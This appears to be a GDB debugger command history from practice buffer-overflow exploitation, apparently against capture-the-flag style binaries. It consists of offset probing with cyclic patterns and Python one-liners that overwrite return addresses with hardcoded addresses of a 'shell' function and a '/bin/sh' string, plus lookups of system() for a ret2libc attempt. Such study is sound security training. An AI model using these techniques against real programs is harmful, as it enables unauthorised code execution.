disassemble main
r < <(python -c 'print "A" * 20)
r < <(python -c 'print "A" * 20')
r < <(python -c 'print "A" * 40')
r $(python -c 'print "A" * 40')
r $(python -c 'print "A" * 20')
r $(python -c 'print "A" * 30')
r $(python -c 'print "A" * 40')
r $(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2"')
r $(python -c 'print "A" * 31 + "B" * 4')
r $(python -c 'print "A" * 31 + "\xef\xbe\xad\xde"')
p shell
r $(python -c 'print "A" * 31 + "\xad\x86\x04\x08"')
exit
q
r $(python -c 'print "A" * 15')
r $(python -c 'print "A" * 15')
r $(python -c 'print "A" * 16')
r $(python -c 'print "A" * 15 + "\xef\xbe\xad\xde"')
q
disassemble main
r $(python -c 'print "A" * 40)
r $(python -c 'print "A" * 40')
r $(python -c 'print "A" * 15')
r $(python -c 'print "A" * 15 + "B" * 4')
search "/bin/sh"
r
disassemble print_name 
break *0x080486e3
r
search "/bin/sh"
x/12s 0x080486e3
x/s 0x080486e3
x/s 0x80487d0
break shell
r
c
r
c
r $(python -c 'print "A" * 31 + "B" * 4)
r $(python -c 'print "A" * 31 + "B" * 4')
c
r $(python -c 'print "A" * 40')
c
r $(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A"')
c
r $(python -c 'print "A" * 27 + "B" * 4')
c
p shell
r $(python -c 'print "A" * 27 + "\xbd\x86\x04\x08"')
c
ni
c
break strcpy
break shell
r
r $(python -c 'print "A" * 27 + "\xbd\x86\x04\x08"')
r
disassemble main
break strcpy
r
r < <(python -c 'print "A" * 16')
r $(python -c 'print "A" * 16')
r $(python -c 'print "A" * 15')
r $(python -c 'print "A" * 17 + "B" * 4)
r $(python -c 'print "A" * 17 + "B" * 4)
r $(python -c 'print "A" * 17 + "B" * 4')
r $(python -c 'print "A" * 27 + "B" * 4')
break shell
r $(python -c 'print "A" * 27 + "\xbd\x86\x04\x08"')
ni
r
search "/bin/sh"
r $(python -c 'print "A" * 27 + "\xbd\x86\x04\x08" + "JUNK" + "\xd0\x87\x04\x08"')
ni
r $(python -c 'print "A" * 27 + "\xbd\x86\x04\x08" + "\xd0\x87\x04\x08"')
ni
r
r $(python -c 'print "A" * 27 + "\xbd\x86\x04\x08" + "C" * 8')
ni
r $(python -c 'print "A" * 27 + "\xbd\x86\x04\x08" + "\xd0\x87\x04\x08"')
ni
r $(python -c 'print "A" * 27 + "\xbd\x86\x04\x08" + "CCCC"')
ni
r $(python -c 'print "A" * 27 + "\xbd\x86\x04\x08" + "JUNK" + "CCCC"')
ni
$(python -c 'print "A" * 27 + "\xbd\x86\x04\x08" + "JUNK" + "\xd0\x87\x04\x08"')
r $(python -c 'print "A" * 27 + "\xbd\x86\x04\x08" + "JUNK" + "\xd0\x87\x04\x08"')
ni
q
r < <(python x1a.py)
search "/bin/"
vmmap
p system
r
p system
r
p system
search "/bin/"
vmmap
r
r
r < <(python x1a.py)
r
r < <(python x1a.py)
q
q
r
q
r > >(python x1a.py )
r < <(python x1a.py )
r < <(python x1a.py)
pattern
q
checksec 
argv
break main
r
break main
delete breakpoints 
break main
r
argv
q
r < <(python -c 'print "A" * 300 + "D" * 24 + "B" * 1 + "E" * 20 + "B" * 11')
r < <(python -c 'print "A" * 300 + "D" * 24 + "B" * 1 + "E" * 20 + "B" * 115')
r < <(python -c 'print "A" * 300 + "D" * 24 + "B" * 1 + "E" * 20 + "B" * 15')
r < <(python -c 'print "A" * 300 + "D" * 24 + "B" * 1 + "E" * 20 + "B" * 100')
r < <(python -c 'print "A" * 300 + "D" * 24 + "B" * 1 + "E" * 20 + "B" * 50')
r < <(python -c 'print "A" * 300 + "D" * 24 + "B" * 1 + "E" * 20 + "B" * 51')
r < <(python -c 'print "A" * 300 + "D" * 24 + "B" * 1 + "E" * 20 + "B" * 52')
r < <(python -c 'print "A" * 300 + "D" * 24 + "B" * 1 + "E" * 20 + "B" * 53')
r < <(python -c 'print "A" * 300 + "D" * 24 + "B" * 1 + "E" * 20 + "B" * 54')
r < <(python -c 'print "A" * 300 + "D" * 24 + "B" * 1 + "E" * 20 + "B" * 55')
r < <(python -c 'print "A" * 300 + "D" * 24 + "B" * 1 + "E" * 20 + "B" * 56')
r < <(python -c 'print "A" * 300 + "D" * 24 + "B" * 1 + "E" * 20 + "B" * 100')
pattern_create -l 100
pattern_create 100
r < <(python -c 'print "A" * 300 + "D" * 24 + "B" * 1 + "E" * 20 + "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"')
pattern_offset 0x32463b6e
pattern_offset -q 0x32463b6e
pattern_offset -h
pattern_offset
pattern_offset 0x32463b6e
pattern_offset -q 0x32463b6e
pattern_offset 0x32463b6e
pattern_offset q 0x32463b6e
pattern_offset qqweqwe 0x32463b6e
pattern_offset n;F2
r
pattern_offset 2F;n
pattern_offset n;F2
pattern_offset n;
pattern_offset n;F
pattern_offset n;F2
r < <(python x1a.py)
r
ni
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
r
p system
r
p system
search "/bin/"
r
search "/bin/
search "/bin/"
find "/bin"
vmmap 
q
r < <(python x1a.py)
p system
checksec
r
r
r
r
r
r
r
break system
r
p system
p read
r
r
r
ni
ps
exit
quit
